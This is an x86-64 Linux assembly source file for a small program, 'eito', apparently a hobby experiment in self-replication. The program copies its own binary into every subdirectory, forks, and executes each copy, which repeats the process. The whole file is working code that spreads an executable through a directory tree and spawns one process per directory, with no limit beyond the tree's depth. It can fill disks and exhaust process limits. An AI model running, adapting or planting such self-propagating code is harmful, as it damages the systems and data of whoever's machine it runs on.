BITS 64

; ====================================================================
; 
; e(xecute)ito
; nasm implementation of mito
; copies self into all immediate directories, forks, then executes the copy
; very fast as it only goes one directory deep
; uses the most memory as each copy is executed as a separate process
;
; ====================================================================

;--------- CONSTANTS ---------; 

; file syscall numbers
SYS_WRITE   equ 0x1         
SYS_READ    equ 0x0         
SYS_CLOSE   equ 0x3         
SYS_EXIT    equ 0x3c        
SYS_OPEN    equ 0x2         

SYS_GETDENTS64  equ 0xd9
SYS_CHDIR       equ 0x50
SYS_SENDFILE    equ 0x28
SYS_EXECVE      equ 0x3b
SYS_FORK        equ 0x39
SYS_WAIT4       equ 0x3d

; open macros
O_RDONLY    equ 0x0
O_WRONLY    equ 0x1
O_CREAT     equ 0x40
O_DIRECTORY equ 0x10000
DT_DIR      equ 0x4
BUFSIZ      equ 0x2000
;--------- CONSTANTS ---------; 

global _start

; constants
;section .data

; variables 
;section .bss

; code
section .text

; arg1 = rdi
; arg2 = rsi
; arg3 = rdx
; arg4 = rcx
; arg5 = r8

;; struct linux_dirent {
;;     unsigned long  d_ino     /* Inode number */
;;     unsigned long  d_off     /* Offset to next linux_dirent */
;;     unsigned short d_reclen  /* Length of this linux_dirent */
;;     char           d_name[]  /* Filename (null-terminated) */
;;                       /* length is actually (d_reclen - 2 -
;;                          offsetof(struct linux_dirent, d_name)) */
;;     char           pad       // Zero padding byte
;;     char           d_type    // File type (only since Linux
;;                              // 2.6.4) offset is (d_reclen + 1)
;; }
;;
;;

_start:
    ;; char *r8 = ".{argv[0]}" // e.g. "../aito"
    mov rbp, rsp
    mov r8, [rsp+8]
    dec r8
    mov byte [r8], '.' 

    ;; int r9 = open(".", O_DIRECTORY)
    ;; if (r9 < 0) return 1
    xor rax, rax
    push '.'
    mov rdi, rsp
    mov rsi, O_DIRECTORY
    mov al, SYS_OPEN
    syscall
    cmp rax, 0
    jle bexit
    mov r9, rax

    ;; size_t r10 = getdents64(r9, (struct linux_dirent *)rsp, BUFSIZ)
    xor rax, rax
    sub rsp, BUFSIZ
    mov rdi, r9
    mov rsi, rsp
    mov rdx, BUFSIZ
    mov al, SYS_GETDENTS64
    syscall
    cmp rax, 0
    jl bexit
    mov r10, rax

    ;; close(r9)
    mov rdi, r9
    xor rax, rax
    mov al, SYS_CLOSE
    syscall

dirloop:
    ;; while (r10 > 0) {
    mov rdi, rsp
    xor r9, r9
    mov r15b, byte [rsp+0x12]
    ;;     unsigned short r9w = d_reclen   // rsp+0x10
    mov r9w, word [rsp+0x10]   
    ;;     rsp += r9W   // (next dirent)
    add rsp, r9                
    ;;     r10 -= r9w 
    test r10, r10              
    jle gexit
    sub r10, r9                
    ;;     char r9b = d_type   // (rsp + d_reclen - 1)
    mov r9b, byte [rsp-1]    

    ;;     if (d_type != DT_DIR || d_name[0:2] == ".\0" || d_name[0:2] == "..") continue
    cmp r15b, byte DT_DIR  
    jne dirloop 
    add rdi, 0x13
    cmp byte [rdi], '.'
    jne fork 
    cmp byte [rdi+1], '.'
    je dirloop 
    cmp byte [rdi+1], 0x0 
    je dirloop

    ;;     else if (!fork()) {
fork:
    xor rax, rax
    mov al, SYS_FORK
    syscall
    test rax, rax
    jnz dirloop 
    
    ;;         chdir(rdi)
    xor rax, rax
    mov al, SYS_CHDIR
    syscall
    cmp rax, 0
    jl bexit

    ;;         int r13 = open(r8, O_RDONLY)
    ;;         if (r13 < 0) return 1
    mov rdi, r8
    xor rsi, rsi            ; O_RDONLY
    xor rax, rax
    mov al, SYS_OPEN
    syscall
    cmp rax, 0
    jle bexit
    mov r13, rax

    ;;         int r14 = open(r8+3, O_CREAT|O_WRONLY, 0777)
    ;;         if (r14 < 0) return 1
    add rdi, 3
    mov rsi, O_CREAT ^ O_WRONLY
    mov rdx, 0x1ff          ; 0777, umask
    xor rax, rax
    mov al, SYS_OPEN
    syscall
    cmp rax, 0
    jle bexit
    mov r14, rax

    ;;         while (rax = sendfile(r14, r13, 0, BUFSIZ)) if (rax < 0) return 1
cp:
    mov rdi, r14
    mov rsi, r13
    xor rdx, rdx
    mov r10, BUFSIZ
    xor rax, rax
    mov al, SYS_SENDFILE
    syscall
    cmp rax, 0
    jl bexit
    jnz cp

    ;;         close(r15), close(r13)
    mov rdi, r14
    xor rax, rax
    mov al, SYS_CLOSE
    syscall
    mov rdi, r13
    xor rax, rax
    mov al, SYS_CLOSE
    syscall

    ;;         execve(r8+3, argv, envp)
    ;;     }
    mov rdi, r8
    add rdi, 3
    mov rsi, [rbp]
    add rsi, 2
    imul rsi, 8
    mov rdx, rbp
    add rdx, rsi
    mov rsi, rbp
    add rsi, 8
    xor rax, rax
    mov al, SYS_EXECVE
    syscall
    jmp bexit
    ;; }

    ;; return 0
gexit:
    xor rdi, rdi
    jmp exit

bexit:
    xor rdi, rdi
    inc rdi

exit:
    mov rsp, rbp
    xor rax, rax
    mov al, SYS_EXIT 
    syscall


